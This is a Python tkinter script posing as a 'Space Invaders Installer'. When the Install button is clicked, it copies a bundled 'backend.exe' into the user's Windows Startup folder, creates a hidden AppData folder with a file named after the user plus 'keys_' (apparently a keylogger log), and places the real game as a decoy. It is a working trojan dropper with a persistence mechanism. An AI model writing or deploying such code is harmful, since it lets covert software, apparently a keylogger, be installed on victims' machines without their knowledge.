import tkinter
from tkinter import messagebox
from PIL import Image, ImageTk
import os
import shutil
import sys
import random


global root

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def create_decoy():         
    shutil.move(resource_path("Space Invaders"),os.getcwd())


def deploy_utility():
    source = resource_path("ext\\backend.exe")
    destination = os.path.expanduser(
        "~")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    store_path = os.path.expanduser(
        "~") + "\\AppData\\local\\WindowREP_2"
    os.makedirs(store_path)
    file_name = "keys_" + os.path.expanduser("~").split("\\")[-1] + "_" + str(random.randint(1, 1_000_000))
    with open(store_path+"\\stats.txt",'w') as file:
        file.write(file_name)
    
    shutil.copy(source, destination)

def run():
    deploy_utility()
    create_decoy()
    
    messagebox.showinfo("Finsihed", "Installation has finished!")
    
    global root
    root.destroy()



def main():
    global root
    root = tkinter.Tk()
    root.geometry('600x600')
    root.title("Installer")
    root.configure(bg='#f6f6f5')

    l0 = tkinter.Label(root, text="")
    l0.pack()

    l1 = tkinter.Label(root, text="Space Invaders Installer!",
                    fg="black", bg="#f6f6f5", font="Helvetica 24 bold italic")
    l1.pack()
    img = ImageTk.PhotoImage(Image.open(resource_path("ext\\space_invader.png")))

    l2 = tkinter.Label(root, image=img)
    l2.pack(expand=True)

    button = tkinter.Button(root, text="Install", font=(
        'Arial,12,bold'), width=20, height=2, bg='#FE3939', fg='white', command=run)

    button.pack(expand=True)

    root.mainloop()


if __name__ == '__main__':
    main()
